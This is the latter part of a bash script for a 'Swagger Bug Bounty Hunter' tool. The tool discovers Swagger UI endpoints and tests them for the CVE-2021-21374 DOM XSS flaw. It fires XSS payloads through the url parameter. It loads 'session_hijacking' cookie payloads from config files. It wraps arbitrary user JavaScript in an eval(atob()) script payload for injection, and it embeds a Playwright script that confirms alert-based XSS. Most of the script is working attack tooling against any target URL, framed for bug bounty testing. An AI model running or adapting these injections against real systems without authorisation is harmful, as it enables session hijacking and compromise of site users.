    [[ "$CRAWL4AI_ENABLED" == true ]] && echo -e "  Crawl4AI Analysis: ${CYAN}${OUTPUT_DIR}/crawl4ai_analysis/${NC}"
    echo ""
    
    if [[ $VULNERABLE_XSS -gt 0 ]] || [[ $VULNERABLE_ENDPOINTS -gt 0 ]]; then
        echo -e "${GREEN}${BOLD}🎉 CONGRATULATIONS!${NC}"
        echo -e "${GREEN}   Valid security findings discovered - Perfect for bug bounty submission${NC}"
        echo -e "${GREEN}   Professional report generated with PoCs and remediation guidance${NC}"
    else
        echo -e "${YELLOW}${BOLD}ℹ️  ASSESSMENT COMPLETE${NC}"
        echo -e "${YELLOW}   No critical vulnerabilities found, but Swagger exposure noted${NC}"
        echo -e "${YELLOW}   Consider reporting information disclosure if endpoints contain sensitive data${NC}"
    fi
    
    echo ""
    echo -e "${PURPLE}${BOLD}🔗 QUICK ACTIONS:${NC}"
    echo -e "  View Report: ${CYAN}open ${OUTPUT_DIR}/bug_bounty_report.html${NC}"
    echo -e "  Run Advanced Scan: ${CYAN}./bug_bounty_framework/advanced_scan.sh $(echo "$TARGET" | sed -e 's|^[^/]*//||' -e 's|/.*$||')${NC}"
    echo -e "  Share Results: ${CYAN}tar -czf swagger_assessment_$(date +%Y%m%d).tar.gz ${OUTPUT_DIR}${NC}"
}

# Main scan logic function
main_scan_logic() {
    # Create output directory with error handling
    if ! mkdir -p "$OUTPUT_DIR" 2>/dev/null; then
        print_error "Failed to create output directory: $OUTPUT_DIR"
        return 1
    fi
    
    # Check if output directory is writable
    if ! [[ -w "$OUTPUT_DIR" ]]; then
        print_error "Output directory is not writable: $OUTPUT_DIR"
        return 1
    fi
    
    print_status "Starting Swagger Bug Bounty Assessment"
    print_status "Target: $TARGET"
    print_status "Output Directory: $OUTPUT_DIR"
    print_status "Scan Engine: $(get_scan_engine)"
    [[ -n "$PROXY" ]] && print_status "Proxy: $PROXY"
    
    # Load configuration files
    load_configuration_files
    
    echo ""
    
    # Download wordlists
    download_wordlists
    
    # Extract domain for subdomain scanning
    local domain=$(echo "$TARGET" | sed -e 's|^[^/]*//||' -e 's|/.*$||')
    local targets_file="${OUTPUT_DIR}/targets.txt"
    
    # Phase 1: Subdomain Enumeration (if enabled)
    if [[ "$SUBDOMAIN_SCAN" == true ]]; then
        perform_subdomain_enumeration "$domain" "$targets_file"
    else
        echo "$TARGET" > "$targets_file"
    fi
    
    # Phase 2: Swagger Discovery (parallel or sequential)
    if [[ "$PARALLEL_SCAN" == true ]] && [[ $(wc -l < "$targets_file") -gt 1 ]]; then
        parallel_swagger_discovery "$targets_file" "${OUTPUT_DIR}/discovered_endpoints.txt"
    else
        # Use original discovery method for single target
        discover_swagger_endpoints "$TARGET" "${OUTPUT_DIR}/discovery_results.txt"
    fi
    
    # Phase 3: Enhanced XSS Testing with configuration files
    test_enhanced_swagger_xss "${OUTPUT_DIR}/discovered_endpoints.txt" "${OUTPUT_DIR}/xss_results.txt"
    
    # Phase 4: API Analysis
    analyze_api_specs "${OUTPUT_DIR}/discovered_endpoints.txt" "${OUTPUT_DIR}/api_analysis.txt"
    
    # Phase 5: Deep Content Analysis (if enabled)
    if [[ "$CRAWL4AI_ENABLED" == true ]]; then
        crawl4ai_analysis "${OUTPUT_DIR}/discovered_endpoints.txt" "${OUTPUT_DIR}/crawl4ai_results.txt"
    fi
    
    # Phase 6: Playwright Testing (if enabled)
    if [[ "$PLAYWRIGHT_ENABLED" == true ]]; then
        playwright_analysis "${OUTPUT_DIR}/discovered_endpoints.txt" "${OUTPUT_DIR}/playwright_results.txt"
    fi
    
    # Phase 7: Integration with Bug Bounty Framework
    integrate_with_framework "$TARGET"
    
    # Phase 8: Report Generation
    generate_bug_bounty_report "$TARGET"
    
    # Final Summary
    display_final_summary "$TARGET"
}

# Function to load and process configuration files
load_configuration_files() {
    print_header "📄 LOADING CONFIGURATION FILES"
    
    # Load rlogin.json
    if [[ -n "$RLOGIN_CONFIG" && -f "$RLOGIN_CONFIG" ]]; then
        print_status "Loading remote login configuration..."
        process_rlogin_config "$RLOGIN_CONFIG"
    fi
    
    # Load xsscookie.json
    if [[ -n "$XSSCOOKIE_CONFIG" && -f "$XSSCOOKIE_CONFIG" ]]; then
        print_status "Loading XSS cookie configuration..."
        process_xsscookie_config "$XSSCOOKIE_CONFIG"
    fi
    
    # Load xsstest configurations
    if [[ -n "$XSSTEST_CONFIG" && -f "$XSSTEST_CONFIG" ]]; then
        print_status "Loading XSS test configuration (JSON)..."
        process_xsstest_json_config "$XSSTEST_CONFIG"
    fi
    
    if [[ -n "$XSSTEST_YAML_CONFIG" && -f "$XSSTEST_YAML_CONFIG" ]]; then
        print_status "Loading XSS test configuration (YAML)..."
        process_xsstest_yaml_config "$XSSTEST_YAML_CONFIG"
    fi
    
    # Load script.js
    if [[ -n "$SCRIPT_JS_CONFIG" && -f "$SCRIPT_JS_CONFIG" ]]; then
        print_status "Loading custom JavaScript configuration..."
        process_scriptjs_config "$SCRIPT_JS_CONFIG"
    fi
    
    # Load login.json
    if [[ -n "$LOGIN_CONFIG" && -f "$LOGIN_CONFIG" ]]; then
        print_status "Loading login configuration..."
        process_login_config "$LOGIN_CONFIG"
    fi
    
    # Load Swagger.yaml
    if [[ -n "$SWAGGER_YAML_CONFIG" && -f "$SWAGGER_YAML_CONFIG" ]]; then
        print_status "Loading custom Swagger specification..."
        process_swagger_yaml_config "$SWAGGER_YAML_CONFIG"
    fi
}

# Configuration processing functions
process_rlogin_config() {
    local config_file="$1"
    local config_dir="${OUTPUT_DIR}/config"
    mkdir -p "$config_dir"
    
    if command -v jq >/dev/null 2>&1; then
        # Extract authentication methods
        local basic_enabled=$(jq -r '.login_methods.basic_auth.enabled' "$config_file" 2>/dev/null)
        if [[ "$basic_enabled" == "true" ]]; then
            local username=$(jq -r '.login_methods.basic_auth.username' "$config_file" 2>/dev/null)
            local password=$(jq -r '.login_methods.basic_auth.password' "$config_file" 2>/dev/null)
            export RLOGIN_BASIC_AUTH="$username:$password"
            print_success "Basic authentication configured"
        fi
        
        # Extract bearer token
        local bearer_enabled=$(jq -r '.login_methods.bearer_token.enabled' "$config_file" 2>/dev/null)
        if [[ "$bearer_enabled" == "true" ]]; then
            local token=$(jq -r '.login_methods.bearer_token.token' "$config_file" 2>/dev/null)
            export RLOGIN_BEARER_TOKEN="$token"
            print_success "Bearer token configured"
        fi
        
        # Extract API key
        local apikey_enabled=$(jq -r '.login_methods.api_key.enabled' "$config_file" 2>/dev/null)
        if [[ "$apikey_enabled" == "true" ]]; then
            local key=$(jq -r '.login_methods.api_key.key' "$config_file" 2>/dev/null)
            local header=$(jq -r '.login_methods.api_key.header_name' "$config_file" 2>/dev/null)
            export RLOGIN_API_KEY="$key"
            export RLOGIN_API_HEADER="$header"
            print_success "API key configured"
        fi
    fi
}

process_xsscookie_config() {
    local config_file="$1"
    local config_dir="${OUTPUT_DIR}/config"
    mkdir -p "$config_dir"
    
    # Copy cookie payloads for XSS testing
    cp "$config_file" "$config_dir/xsscookie_loaded.json"
    export XSSCOOKIE_LOADED="$config_dir/xsscookie_loaded.json"
    print_success "XSS cookie payloads loaded"
}

process_xsstest_json_config() {
    local config_file="$1"
    local config_dir="${OUTPUT_DIR}/config"
    mkdir -p "$config_dir"
    
    # Copy XSS test payloads
    cp "$config_file" "$config_dir/xsstest_loaded.json"
    export XSSTEST_LOADED="$config_dir/xsstest_loaded.json"
    print_success "XSS test payloads (JSON) loaded"
}

process_xsstest_yaml_config() {
    local config_file="$1"
    local config_dir="${OUTPUT_DIR}/config"
    mkdir -p "$config_dir"
    
    # Copy YAML config
    cp "$config_file" "$config_dir/xsstest_loaded.yaml"
    export XSSTEST_YAML_LOADED="$config_dir/xsstest_loaded.yaml"
    print_success "XSS test payloads (YAML) loaded"
}

process_scriptjs_config() {
    local config_file="$1"
    local config_dir="${OUTPUT_DIR}/config"
    mkdir -p "$config_dir"
    
    # Copy JavaScript file
    cp "$config_file" "$config_dir/script_loaded.js"
    export SCRIPT_JS_LOADED="$config_dir/script_loaded.js"
    print_success "Custom JavaScript loaded"
}

process_login_config() {
    local config_file="$1"
    local config_dir="${OUTPUT_DIR}/config"
    mkdir -p "$config_dir"
    
    if command -v jq >/dev/null 2>&1; then
        # Extract login credentials
        local login_url=$(jq -r '.authentication.login_url' "$config_file" 2>/dev/null)
        local username=$(jq -r '.authentication.credentials.username' "$config_file" 2>/dev/null)
        local password=$(jq -r '.authentication.credentials.password' "$config_file" 2>/dev/null)
        
        export LOGIN_URL="$login_url"
        export LOGIN_USERNAME="$username"
        export LOGIN_PASSWORD="$password"
        
        cp "$config_file" "$config_dir/login_loaded.json"
        export LOGIN_CONFIG_LOADED="$config_dir/login_loaded.json"
        print_success "Login configuration loaded"
    fi
}

process_swagger_yaml_config() {
    local config_file="$1"
    local config_dir="${OUTPUT_DIR}/config"
    mkdir -p "$config_dir"
    
    # Copy Swagger YAML and analyze it
    cp "$config_file" "$config_dir/swagger_loaded.yaml"
    export SWAGGER_YAML_LOADED="$config_dir/swagger_loaded.yaml"
    
    # Extract API endpoints from custom Swagger spec
    if command -v yq >/dev/null 2>&1; then
        yq eval '.paths | keys' "$config_file" > "$config_dir/custom_endpoints.txt" 2>/dev/null || true
    else
        # Fallback: extract paths with grep
        grep -oE '^\s*[/][^:]*:' "$config_file" | sed 's/:$//' | sed 's/^\s*//' > "$config_dir/custom_endpoints.txt" 2>/dev/null || true
    fi
    
    print_success "Custom Swagger specification loaded"
}

# Enhanced XSS testing with configuration files
test_enhanced_swagger_xss() {
    local discovered_file="$1"
    local output_file="$2"
    
    print_header "🎯 ENHANCED XSS VULNERABILITY TESTING"
    
    if [[ ! -f "$discovered_file" ]]; then
        print_warning "No discovered endpoints file found"
        return 0
    fi
    
    # Start with original XSS testing
    test_swagger_xss "$discovered_file" "$output_file"
    
    # Enhanced testing with loaded configurations
    if [[ -n "$XSSCOOKIE_LOADED" ]]; then
        test_xss_with_cookie_config "$discovered_file" "$output_file"
    fi
    
    if [[ -n "$XSSTEST_LOADED" ]]; then
        test_xss_with_json_config "$discovered_file" "$output_file"
    fi
    
    if [[ -n "$XSSTEST_YAML_LOADED" ]]; then
        test_xss_with_yaml_config "$discovered_file" "$output_file"
    fi
    
    if [[ -n "$SCRIPT_JS_LOADED" ]]; then
        test_xss_with_custom_js "$discovered_file" "$output_file"
    fi
}

test_xss_with_cookie_config() {
    local discovered_file="$1"
    local output_file="$2"
    
    print_status "Testing XSS with cookie configuration..."
    
    if command -v jq >/dev/null 2>&1 && [[ -f "$XSSCOOKIE_LOADED" ]]; then
        # Extract payloads from cookie config
        jq -r '.cookie_payloads.session_hijacking[].payload' "$XSSCOOKIE_LOADED" 2>/dev/null | while IFS= read -r payload; do
            [[ -z "$payload" ]] && continue
            
            while IFS= read -r endpoint; do
                [[ -z "$endpoint" ]] && continue
                test_single_xss_payload "$endpoint" "$payload" "$output_file" "cookie-config"
            done < "$discovered_file"
        done
    fi
}

test_xss_with_json_config() {
    local discovered_file="$1"
    local output_file="$2"
    
    print_status "Testing XSS with JSON configuration..."
    
    if command -v jq >/dev/null 2>&1 && [[ -f "$XSSTEST_LOADED" ]]; then
        # Extract payloads from JSON config
        jq -r '.payloads.swagger_specific[]' "$XSSTEST_LOADED" 2>/dev/null | while IFS= read -r payload; do
            [[ -z "$payload" ]] && continue
            
            while IFS= read -r endpoint; do
                [[ -z "$endpoint" ]] && continue
                test_single_xss_payload "$endpoint" "$payload" "$output_file" "json-config"
            done < "$discovered_file"
        done
    fi
}

test_xss_with_yaml_config() {
    local discovered_file="$1"
    local output_file="$2"
    
    print_status "Testing XSS with YAML configuration..."
    
    if [[ -f "$XSSTEST_YAML_LOADED" ]]; then
        # Extract payloads from YAML (simple grep approach)
        grep -A 10 "swagger_json:" "$XSSTEST_YAML_LOADED" | grep "^    -" | sed 's/^    - //' | sed 's/^"//' | sed 's/"$//' | while IFS= read -r payload; do
            [[ -z "$payload" ]] && continue
            
            while IFS= read -r endpoint; do
                [[ -z "$endpoint" ]] && continue
                test_single_xss_payload "$endpoint" "$payload" "$output_file" "yaml-config"
            done < "$discovered_file"
        done
    fi
}

test_xss_with_custom_js() {
    local discovered_file="$1"
    local output_file="$2"
    
    print_status "Testing XSS with custom JavaScript..."
    
    if [[ -f "$SCRIPT_JS_LOADED" ]]; then
        # Create JavaScript injection payloads
        local js_content=$(cat "$SCRIPT_JS_LOADED")
        local encoded_js=$(printf '%s' "$js_content" | base64 -w 0)
        local payload="<script>eval(atob('$encoded_js'))</script>"
        
        while IFS= read -r endpoint; do
            [[ -z "$endpoint" ]] && continue
            test_single_xss_payload "$endpoint" "$payload" "$output_file" "custom-js"
        done < "$discovered_file"
    fi
}

test_single_xss_payload() {
    local endpoint="$1"
    local payload="$2"
    local output_file="$3"
    local source="$4"
    
    # Skip JSON/YAML endpoints for UI-based XSS
    if echo "$endpoint" | grep -qE '\.(json|yaml)$'; then
        return 0
    fi
    
    # URL encode the payload
    local encoded_payload
    encoded_payload=$(printf '%s' "$payload" | jq -sRr @uri 2>/dev/null || echo "$payload" | sed 's/ /%20/g; s/"/%22/g; s/</%3C/g; s/>/%3E/g')
    
    local test_url="${endpoint}?url=data:application/json,${encoded_payload}"
    
    # Add authentication headers if available
    local curl_opts=(
        -s
        --max-time "$TIMEOUT"
        -H "User-Agent: $USER_AGENT"
    )
    
    # Add authentication from rlogin config
    if [[ -n "$RLOGIN_BASIC_AUTH" ]]; then
        curl_opts+=(-u "$RLOGIN_BASIC_AUTH")
    fi
    
    if [[ -n "$RLOGIN_BEARER_TOKEN" ]]; then
        curl_opts+=(-H "Authorization: Bearer $RLOGIN_BEARER_TOKEN")
    fi
    
    if [[ -n "$RLOGIN_API_KEY" && -n "$RLOGIN_API_HEADER" ]]; then
        curl_opts+=(-H "$RLOGIN_API_HEADER: $RLOGIN_API_KEY")
    fi
    
    # Add proxy if specified
    [[ -n "$PROXY" ]] && curl_opts+=(-x "$PROXY")
    
    local response
    response=$(timeout "$((TIMEOUT + 5))" curl "${curl_opts[@]}" "$test_url" 2>/dev/null || echo "")
    
    # Check for XSS indicators in response
    if [[ -n "$response" ]] && echo "$response" | grep -qE "(alert\(|<script|onerror=|onload=)" && \
       echo "$response" | grep -qi "swagger"; then
        
        VULNERABLE_XSS=$((VULNERABLE_XSS + 1))
        print_vuln "XSS CONFIRMED ($source): $endpoint"
        
        echo "XSS-VULNERABLE-$source: $endpoint" >> "$output_file"
        echo "PAYLOAD-$source: $payload" >> "$output_file"
        echo "TEST-URL: $test_url" >> "$output_file"
        echo "SOURCE: $source" >> "$output_file"
        echo "" >> "$output_file"
    fi
    
    sleep 0.5
}

# Playwright analysis function
playwright_analysis() {
    local discovered_file="$1"
    local output_file="$2"
    
    print_header "🎭 PLAYWRIGHT BROWSER ANALYSIS"
    
    if ! command -v python3 >/dev/null 2>&1; then
        print_warning "Python3 not available, skipping Playwright analysis"
        return 0
    fi
    
    if ! python3 -c "import playwright" 2>/dev/null; then
        print_warning "Playwright not installed, skipping browser analysis"
        print_status "Install with: pip install playwright && playwright install"
        return 0
    fi
    
    if [[ ! -f "$discovered_file" ]] || [[ ! -s "$discovered_file" ]]; then
        print_warning "No endpoints to analyze with Playwright"
        return 0
    fi
    
    local playwright_dir="${OUTPUT_DIR}/playwright_analysis"
    mkdir -p "$playwright_dir"
    
    # Create Playwright analysis script
    cat > "${playwright_dir}/swagger_playwright.py" << 'EOF'
import asyncio
import sys
import json
from pathlib import Path
from playwright.async_api import async_playwright

async def analyze_swagger_with_playwright(url, output_dir):
    """Analyze Swagger endpoint with Playwright"""
    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(
                headless=bool(os.environ.get('PLAYWRIGHT_HEADLESS', 'true') == 'true'),
                slow_mo=int(os.environ.get('PLAYWRIGHT_SLOWMO', '0'))
            )
            
            context = await browser.new_context(
                user_agent="SwaggerBugBountyHunter/4.0 (Playwright)",
                viewport={'width': 1920, 'height': 1080}
            )
            
            page = await context.new_page()
            
            # Navigate to the page
            response = await page.goto(url, timeout=30000)
            
            if response and response.ok:
                # Take screenshot
                screenshot_path = f"{output_dir}/screenshot_{url.replace('https://', '').replace('http://', '').replace('/', '_')}.png"
                await page.screenshot(path=screenshot_path, full_page=True)
                
                # Extract page information
                title = await page.title()
                content = await page.content()
                
                # Check for Swagger UI indicators
                swagger_version = await page.evaluate("""
                    () => {
                        if (window.SwaggerUIBundle) return window.SwaggerUIBundle.version || 'unknown';
                        const scripts = Array.from(document.scripts);
                        for (let script of scripts) {
                            if (script.src && script.src.includes('swagger-ui')) {
                                const match = script.src.match(/swagger-ui[.-](\d+\.\d+\.\d+)/);
                                if (match) return match[1];
                            }
                        }
                        return null;
                    }
                """)
                
                # Test XSS with JavaScript execution
                xss_results = []
                test_payloads = [
                    "javascript:alert('XSS-Test')",
                    "<img src=x onerror=alert('XSS-IMG')>",
                    "<svg onload=alert('XSS-SVG')>"
                ]
                
                for payload in test_payloads:
                    try:
                        # Try to inject via URL parameter
                        test_url = f"{url}?url=data:application/json,{payload}"
                        await page.goto(test_url, timeout=10000)
                        
                        # Wait for potential alert and capture it
                        try:
                            dialog = await page.wait_for_event('dialog', timeout=2000)
                            if dialog:
                                xss_results.append({
                                    'payload': payload,
                                    'method': 'url_parameter',
                                    'confirmed': True,
                                    'dialog_message': dialog.message
                                })
                                await dialog.accept()
                        except:
                            pass
                            
                    except Exception as e:
                        pass
                
                analysis = {
                    "url": url,
                    "title": title,
                    "swagger_version": swagger_version,
                    "screenshot": screenshot_path if await Path(screenshot_path).exists() else None,
                    "xss_vulnerabilities": xss_results,
                    "page_size": len(content),
                    "has_swagger_ui": "swagger-ui" in content.lower(),
                    "has_openapi": "openapi" in content.lower()
                }
                
                # Save analysis
                filename = url.replace("https://", "").replace("http://", "").replace("/", "_")
                with open(f"{output_dir}/{filename}_playwright.json", "w") as f:
                    json.dump(analysis, f, indent=2)
                
                return analysis
                
            await browser.close()
            
    except Exception as e:
        print(f"Error analyzing {url} with Playwright: {e}")
        return None

async def main():
    if len(sys.argv) != 3:
        print("Usage: python swagger_playwright.py <endpoints_file> <output_dir>")
        sys.exit(1)
    
    endpoints_file = sys.argv[1]
    output_dir = sys.argv[2]
    
    with open(endpoints_file, 'r') as f:
        endpoints = [line.strip() for line in f if line.strip()]
    
    print(f"Analyzing {len(endpoints)} endpoints with Playwright...")
    
    results = []
    for endpoint in endpoints[:5]:  # Limit to first 5 for performance
        result = await analyze_swagger_with_playwright(endpoint, output_dir)
        if result:
            results.append(result)
    
    # Generate summary
    summary = {
        "total_analyzed": len(results),
        "xss_vulnerabilities": sum(len(r.get("xss_vulnerabilities", [])) for r in results),
        "swagger_versions": [r.get("swagger_version") for r in results if r.get("swagger_version")],
        "screenshots_captured": sum(1 for r in results if r.get("screenshot"))
    }
    
    with open(f"{output_dir}/playwright_summary.json", "w") as f:
        json.dump(summary, f, indent=2)
    
    print(f"Playwright analysis complete: {summary}")

if __name__ == "__main__":
    import os
    asyncio.run(main())
EOF
    
    print_status "Running Playwright analysis on discovered endpoints..."
    
    # Run Playwright analyzer
    python3 "${playwright_dir}/swagger_playwright.py" "$discovered_file" "$playwright_dir" 2>/dev/null || {
        print_warning "Playwright analysis failed"
        return 0
    }
    
    # Process results
    if [[ -f "${playwright_dir}/playwright_summary.json" ]]; then
        local summary=$(cat "${playwright_dir}/playwright_summary.json")
        local analyzed=$(echo "$summary" | jq -r '.total_analyzed // 0' 2>/dev/null || echo "0")
        local xss_found=$(echo "$summary" | jq -r '.xss_vulnerabilities // 0' 2>/dev/null || echo "0")
        local screenshots=$(echo "$summary" | jq -r '.screenshots_captured // 0' 2>/dev/null || echo "0")
        
        ADDITIONAL_VULNS=$((ADDITIONAL_VULNS + xss_found))
        
        print_success "Playwright analysis completed: $analyzed pages analyzed, $xss_found XSS found, $screenshots screenshots captured"
        
        # Generate report section
        echo "# Playwright Browser Analysis Results" > "$output_file"
        echo "# Analysis Date: $(date)" >> "$output_file"
        echo "" >> "$output_file"
        echo "$summary" >> "$output_file"
    else
        print_warning "Playwright analysis completed but no summary generated"
    fi
}

# Function to show usage
show_usage() {
    echo -e "${WHITE}${BOLD}Swagger Bug Bounty Hunter - Usage Guide${NC}"
    echo ""
    echo -e "${CYAN}Usage:${NC} $0 [OPTIONS] -t TARGET"
    echo ""
    echo -e "${YELLOW}Required:${NC}"
    echo "  -t, --target URL          Target URL (e.g., https://example.com)"
    echo ""
    echo -e "${YELLOW}Optional:${NC}"
    echo "  -o, --output DIR          Output directory (default: swagger_scan_TIMESTAMP)"
    echo "  -T, --threads NUM         Number of threads (default: 50)"
    echo "  --timeout NUM             Request timeout in seconds (default: 15)"
    echo "  --proxy PROXY             HTTP proxy (e.g., http://127.0.0.1:8080)"
    echo "  --rate-limit NUM          Requests per second (default: 100)"
    echo "  --user-agent STRING       Custom User-Agent string"
    echo "  -s, --subdomain-scan      Enable subdomain enumeration"
    echo "  --no-parallel             Disable parallel scanning"
    echo "  --crawl4ai                Enable crawl4ai deep analysis"
    echo "  --playwright              Enable Playwright browser automation"
    echo "  --max-jobs NUM            Maximum parallel jobs (default: 10)"
    echo ""
    echo -e "${YELLOW}Configuration Files:${NC}"
    echo "  --rlogin FILE             Remote login configuration (rlogin.json)"
    echo "  --xsscookie FILE          XSS cookie testing configuration (xsscookie.json)"
    echo "  --xsstest-json FILE       XSS test payloads in JSON format"
    echo "  --xsstest-yaml FILE       XSS test payloads in YAML format"
    echo "  --script-js FILE          Custom JavaScript injection file"
    echo "  --login FILE              Authentication configuration (login.json)"
    echo "  --swagger-yaml FILE       Custom Swagger specification (Swagger.yaml)"
    echo ""
    echo -e "${YELLOW}Other Options:${NC}"
    echo "  -i, --interactive         Launch interactive menu mode"
    echo "  -v, --verbose             Verbose output"
    echo "  -h, --help                Show this help message"
    echo ""
    echo -e "${GREEN}${BOLD}Examples:${NC}"
    echo "  $0                                                    # Interactive mode"
    echo "  $0 -i                                                 # Interactive mode"
    echo "  $0 -t https://api.example.com                         # Basic scan"
    echo "  $0 -t https://example.com -o custom_scan --timeout 30 -v  # Custom output with verbose"
    echo "  $0 -t https://target.com --proxy http://127.0.0.1:8080     # Scan with proxy"
    echo "  $0 -t https://example.com -s --crawl4ai --max-jobs 20      # Subdomain scan with AI"
    echo "  $0 -t https://api.com --playwright --xsscookie config.json # Browser automation with XSS config"
    echo "  $0 -t https://app.com --login auth.json --rlogin remote.json  # Authenticated scan"
    echo ""
    echo -e "${CYAN}${BOLD}Features:${NC}"
    echo "  🎯 Advanced Swagger/OpenAPI endpoint discovery"
    echo "  🚨 DOM XSS vulnerability testing (CVE-2021-21374)"
    echo "  📋 API specification analysis and sensitive endpoint detection"
    echo "  📊 Professional bug bounty report generation"
    echo "  🔧 Integration with bug bounty framework tools (nuclei, httpx, waybackurls)"
    echo "  🌐 Enhanced wordlists from kdairatchi/swagger research"
    echo "  🌐 Subdomain enumeration with multiple sources (subfinder, assetfinder, wayback)"
    echo "  ⚡ Parallel scanning for improved performance"
    echo "  🕷️ Deep content analysis with crawl4ai integration"
    echo "  🎭 Browser automation with Playwright"
    echo "  📂 Configurable payloads and authentication methods"
    echo "  🎮 Interactive menu system for easy configuration"
    echo "  🔐 Multi-format authentication support (Basic, Bearer, API keys, OAuth2)"
    echo "  📜 Custom JavaScript injection capabilities"
    echo "  📝 JSON/YAML configuration file support"
}

# Main function
main() {
    # Check if no arguments provided - enter interactive mode
    if [[ $# -eq 0 ]]; then
        INTERACTIVE_MODE=true
        show_interactive_menu
        return 0
    fi
    
    print_banner
    
    # Parse command line arguments
    while [[ $# -gt 0 ]]; do
        case $1 in
            -t|--target)
                TARGET="$2"
                shift 2
                ;;
            -o|--output)
                OUTPUT_DIR="$2"
                shift 2
                ;;
            -T|--threads)
                THREADS="$2"
                shift 2
                ;;
            --timeout)
                TIMEOUT="$2"
                shift 2
                ;;
            --proxy)
                PROXY="$2"
                shift 2
                ;;
            --rate-limit)
                RATE_LIMIT="$2"
                shift 2
                ;;
            --user-agent)
                USER_AGENT="$2"
                shift 2
                ;;
            -s|--subdomain-scan)
                SUBDOMAIN_SCAN=true
                shift
                ;;
            --no-parallel)
                PARALLEL_SCAN=false
                shift
                ;;
            --crawl4ai)
                CRAWL4AI_ENABLED=true
                shift
                ;;
            --playwright)
                PLAYWRIGHT_ENABLED=true
                shift
                ;;
            --rlogin)
                RLOGIN_CONFIG="$2"
                shift 2
                ;;
            --xsscookie)
                XSSCOOKIE_CONFIG="$2"
                shift 2
                ;;
            --xsstest-json)
                XSSTEST_CONFIG="$2"
                shift 2
                ;;
            --xsstest-yaml)
                XSSTEST_YAML_CONFIG="$2"
                shift 2
                ;;
            --script-js)
                SCRIPT_JS_CONFIG="$2"
                shift 2
                ;;
            --login)
                LOGIN_CONFIG="$2"
                shift 2
                ;;
            --swagger-yaml)
                SWAGGER_YAML_CONFIG="$2"
                shift 2
                ;;
            --max-jobs)
                MAX_PARALLEL_JOBS="$2"
                shift 2
                ;;
            -v|--verbose)
                VERBOSE=true
                shift
                ;;
            -i|--interactive)
                INTERACTIVE_MODE=true
                shift
                ;;
            -h|--help)
                show_usage
                exit 0
                ;;
            *)
                print_error "Unknown option: $1"
                show_usage
                exit 1
                ;;
        esac
    done
    
    # Validate required parameters
    if [[ -z "$TARGET" ]]; then
        print_error "Target URL is required"
        show_usage
        exit 1
    fi
    
    # Validate URL format
    if ! [[ "$TARGET" =~ ^https?://[a-zA-Z0-9.-]+.*$ ]]; then
        print_error "Invalid URL format. Must start with http:// or https://"
        exit 1
    fi
    
    # Validate numeric parameters
    if ! [[ "$THREADS" =~ ^[0-9]+$ ]] || [[ "$THREADS" -lt 1 ]] || [[ "$THREADS" -gt 200 ]]; then
        print_error "Threads must be a number between 1 and 200"
        exit 1
    fi
    
    if ! [[ "$TIMEOUT" =~ ^[0-9]+$ ]] || [[ "$TIMEOUT" -lt 5 ]] || [[ "$TIMEOUT" -gt 300 ]]; then
        print_error "Timeout must be a number between 5 and 300 seconds"
        exit 1
    fi
    
    if ! [[ "$RATE_LIMIT" =~ ^[0-9]+$ ]] || [[ "$RATE_LIMIT" -lt 1 ]] || [[ "$RATE_LIMIT" -gt 1000 ]]; then
        print_error "Rate limit must be a number between 1 and 1000 requests per second"
        exit 1
    fi
    
    # Clean target URL
    TARGET=$(echo "$TARGET" | sed 's:/*$::')
    
    # Set default output directory
    if [[ -z "$OUTPUT_DIR" ]]; then
        OUTPUT_DIR="swagger_scan_$(date +%Y%m%d_%H%M%S)"
    fi
    
    # Create output directory with error handling
    if ! mkdir -p "$OUTPUT_DIR" 2>/dev/null; then
        print_error "Failed to create output directory: $OUTPUT_DIR"
        exit 1
    fi
    
    # Check if output directory is writable
    if ! [[ -w "$OUTPUT_DIR" ]]; then
        print_error "Output directory is not writable: $OUTPUT_DIR"
        exit 1
    fi
    
    # Check for interactive mode after parsing arguments
    if [[ "$INTERACTIVE_MODE" == true ]]; then
        show_interactive_menu
        return 0
    fi
    
    # Call main scan logic
    main_scan_logic
}

# Trap for cleanup
trap 'print_error "Script interrupted"; exit 1' INT TERM

# Check dependencies with better error messages and integration with bug bounty framework
check_dependencies() {
    local missing_deps=()
    local optional_deps=()
    
    # Required dependencies
    command -v curl >/dev/null 2>&1 || missing_deps+=("curl")
    command -v jq >/dev/null 2>&1 || missing_deps+=("jq")
    command -v awk >/dev/null 2>&1 || missing_deps+=("awk")
    command -v timeout >/dev/null 2>&1 || missing_deps+=("timeout")
    
    # Optional bug bounty framework tools
    command -v nuclei >/dev/null 2>&1 || optional_deps+=("nuclei")
    command -v httpx >/dev/null 2>&1 || optional_deps+=("httpx")
    command -v subfinder >/dev/null 2>&1 || optional_deps+=("subfinder")
    command -v assetfinder >/dev/null 2>&1 || optional_deps+=("assetfinder")
    command -v parallel >/dev/null 2>&1 || optional_deps+=("parallel")
    command -v python3 >/dev/null 2>&1 || optional_deps+=("python3")
    
    # Check for crawl4ai
    if command -v python3 >/dev/null 2>&1; then
        python3 -c "import crawl4ai" 2>/dev/null || optional_deps+=("crawl4ai")
    fi
    
    if [[ ${#missing_deps[@]} -gt 0 ]]; then
        print_error "Missing required dependencies: ${missing_deps[*]}"
        print_error "Install them with: sudo apt install ${missing_deps[*]}"
        exit 1
    fi
    
    if [[ ${#optional_deps[@]} -gt 0 ]]; then
        print_warning "Optional bug bounty tools not found: ${optional_deps[*]}"
        print_warning "Install from bug_bounty_framework for enhanced scanning"
    fi
}

check_dependencies

# Run main function
main "$@"
